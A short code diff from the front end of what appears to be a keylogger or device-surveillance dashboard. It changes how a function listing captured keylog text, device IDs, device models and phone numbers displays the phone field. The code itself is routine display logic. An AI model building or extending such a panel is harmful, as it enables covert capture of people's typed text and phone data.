@@ -1209,7 +1209,7 @@ async function loadGlobalKeylogs(page) {
       const text = escapeHtml(e.text_content || '');
       const devShort = (e.device_id || '').substring(0, 8);
       const model = e.model ? escapeHtml(e.model) : '';
-      const phone = e.phone_number ? escapeHtml(e.phone_number) : '';
+      const phone = e.phone_numbers ? escapeHtml(String(e.phone_numbers).replace(/[\[\]"]/g, '').split(',')[0] || '') : '';
       return `<div style="padding:10px;border-bottom:1px solid var(--border)">
         <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start">
           <div style="flex:1;word-break:break-all;color:var(--text);font-size:13px">${text}</div>
